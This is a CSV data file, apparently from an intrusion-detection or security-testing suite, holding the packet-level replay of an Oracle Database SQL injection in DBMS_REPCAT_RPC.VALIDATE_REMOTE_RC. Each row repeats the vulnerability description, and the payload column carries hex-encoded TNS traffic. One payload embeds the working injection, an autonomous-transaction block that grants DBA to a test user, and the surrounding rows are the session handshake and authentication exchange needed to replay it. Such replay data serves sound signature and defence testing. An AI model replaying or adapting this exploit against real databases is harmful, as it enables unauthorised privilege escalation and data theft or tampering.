XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[01 ]]][[00 00 06 00 00 00 00 00 11 ]]i[[0E 98 A9 C0 05 01 00 00 00 03 00 00 00 03 ]]^[[0F ]]a[[80 00 00 00 00 00 00 F0 BC C0 05 B8 00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 AC A9 C0 05 00 00 00 00 FE ]]@SELECT CHAR_VALUE FROM SYSTEM.PRODUCT_PRIVS WHERE   (UPPER('SQL*@Plus') LIKE UPPER(PRODUCT)) AND   ((UPPER(USER) LIKE USERID) OR 8(USERID = 'PUBLIC')) AND   (UPPER(ATTRIBUTE) = 'ROLES')[[00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[01 02 00 00 06 00 00 00 00 00 11 ]]i[[10 98 A9 C0 05 01 00 00 00 01 00 00 00 03 ]]^[[11 ]])[[04 04 00 00 00 00 00 ]]t[[BD C0 05 ]]6[[00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 AC A9 C0 05 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 AC A9 C0 05 00 00 00 00 ]]6BEGIN DBMS_APPLICATION_INFO.SET_MODULE(:1,NULL); END;[[00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 01 03 00 00 08 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 00 00 00 00 07 08 ]]SQL*Plus"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[00 EA 00 00 06 00 00 00 00 00 11 ]]i[[12 98 A9 C0 05 01 00 00 00 03 00 00 00 03 ]]^[[13 ]]q[[80 00 00 00 00 00 00 80 BD C0 05 ]]([[00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 AC A9 C0 05 01 00 00 00 ]](SELECT DECODE('A','A','1','2') FROM DUAL[[01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 02 03 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 ]]H[[00 00 06 00 00 00 00 00 11 ]]i[[14 98 AD C0 05 01 00 00 00 02 00 00 00 03 ]]h[[15 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 B8 FC 12 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 ]]9[[00 00 06 00 00 00 00 00 03 ]]h[[16 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 B8 FC 12 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[01 87 00 00 06 00 00 00 00 00 03 ]]^[[17 ]]a[[80 00 00 00 00 00 00 B8 BC C0 05 F0 00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 C4 A9 C0 05 00 00 00 00 FE ]]@SELECT SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP@_OBJECTS_LOCAL(:canon_gname); execute immediate ''declare pragma@ autonomous_transaction; begin execute immediate ''''grant dba t0o test_user'''';end;''; end;--','bar') FROM DUAL[[00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 91 00 00 06 00 00 00 00 00 03 ]]^[[18 ]]@[[00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 00 00 00 00 17 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 C4 A9 C0 05 00 00 00 00 00 00 00 00 0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 0D 00 00 06 00 00 00 00 00 03 09 19]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 0A 00 00 06 00 00 00 00 ]]@
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 08 00 00 0B 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 ]] [[00 00 02 00 00 00 01 ]]9[[00 00 08 00 ]][[FF 01 00 00 00 00 ]] aA[[00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 ]][[00 00 06 00 00 00 00 00 DE AD BE EF 00 ]]u[[0A ]] [[01 00 00 04 00 00 04 00 03 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 02 00 06 00 1F 00 0E 00 01 DE AD BE EF 00 03 00 00 00 02 00 04 00 01 00 01 00 02 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 02 00 06 FB FF 00 02 00 02 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 01 00 02 00 00 03 00 02 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 01 00 02 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 B3 00 00 06 00 00 00 00 00 01 06 00 ]]IBMPC/WIN_NT-8.1.0[[00 B2 00 01 00 00 00 ]]d[[00 00 00 ]]`[[01 ]]$[[0F 05 0B 0C 03 0C 0C 05 04 05 0D 06 09 07 08 05 05 05 05 05 0F 05 05 05 05 05 0A 05 05 05 05 05 04 05 06 07 08 08 ]]#G##[[08 11 ]]#[[08 11 ]]A[[B0 ]]#[[00 83 00 B2 07 D0 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]![[06 01 01 01 0D 01 01 04 01 01 01 01 01 01 01 FF FF 03 08 03 00 01 00 ]]?[[01 07 ]]?[[01 01 01 01 03 01 05 02 01 00 01 18]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 16 00 00 06 00 00 00 00 00 02 80 00 00 00 ]]<<<[[80 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 E1 00 00 06 00 00 00 00 00 08 02 00 0C 00 00 00 0C ]]AUTH_SESSKEY@[[00 00 00 ]]@C73D61B9398D4A99D5AE21208FE22981587E0056AFFDBA1E326C3BAE9A4E66EA[[00 00 00 00 0D 00 00 00 0D ]]AUTH_VFR_DATA[[00 00 00 00 ]]9[[09 00 00 04 01 00 00 00 02 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 88 D9 ]]t[[09 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[04 A7 00 00 06 00 00 00 00 00 08 19 00 13 00 00 00 13 ]]AUTH_VERSION_STRING[[0C 00 00 00 0C ]]- Production[[00 00 00 00 10 00 00 00 10 ]]AUTH_VERSION_SQL[[02 00 00 00 02 ]]20[[00 00 00 00 13 00 00 00 13 ]]AUTH_XACTION_TRAITS[[01 00 00 00 01 ]]3[[00 00 00 00 0F 00 00 00 0F ]]AUTH_VERSION_NO[[09 00 00 00 09 ]]169869568[[00 00 00 00 13 00 00 00 13 ]]AUTH_VERSION_STATUS[[01 00 00 00 01 ]]0[[00 00 00 00 15 00 00 00 15 ]]AUTH_CAPABILITY_TABLE[[00 00 00 00 00 00 00 00 0F 00 00 00 0F ]]AUTH_SESSION_ID[[03 00 00 00 03 ]]145[[00 00 00 00 0F 00 00 00 0F ]]AUTH_SERIAL_NUM[[03 00 00 00 03 ]]337[[00 00 00 00 10 00 00 00 10 ]]AUTH_INSTANCE_NO[[01 00 00 00 01 ]]1[[00 00 00 00 10 00 00 00 10 ]]AUTH_FAILOVER_ID[[01 00 00 00 01 ]]1[[00 00 00 00 0F 00 00 00 0F ]]AUTH_NLS_LXLAN[[00 08 00 00 00 08 ]]AMERICAN[[00 00 00 00 16 00 00 00 16 ]]AUTH_NLS_LXCTERRITORY[[00 07 00 00 00 07 ]]AMERICA[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCCURRENCY[[00 01 00 00 00 01 ]]$[[00 00 00 00 14 00 00 00 14 ]]AUTH_NLS_LXCISOCURR[[00 07 00 00 00 07 ]]AMERICA[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCNUMERICS[[00 02 00 00 00 02 ]].,[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCDATEFM[[00 09 00 00 00 09 ]]DD-MON-RR[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCDATELANG[[00 08 00 00 00 08 ]]AMERICAN[[00 00 00 00 11 00 00 00 11 ]]AUTH_NLS_LXCSORT[[00 06 00 00 00 06 ]]BINARY[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCCALENDAR[[00 09 00 00 00 09 ]]GREGORIAN[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCUNIONCUR[[00 01 00 00 00 01 ]]$[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCTIMEFM[[00 0E 00 00 00 0E ]]HH.MI.SSXFF AM[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCSTMPFM[[00 18 00 00 00 18 ]]DD-MON-RR HH.MI.SSXFF AM[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCTTZNFM[[00 12 00 00 00 12 ]]HH.MI.SSXFF AM TZR[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCSTZNFM[[00 1C 00 00 00 1C ]]DD-MON-RR HH.MI.SSXFF AM TZR[[00 00 00 00 11 00 00 00 11 ]]AUTH_SVR_RESPONSE`[[00 00 00 ]]`9E59B1CA023A79D61D14E48347E037082BC1C6A8AF856D78B73B9BF4E235652A3858353803D0F41DE8B62CD043AB2419[[00 00 00 00 04 01 00 00 00 03 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 88 D9 ]]t[[09 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
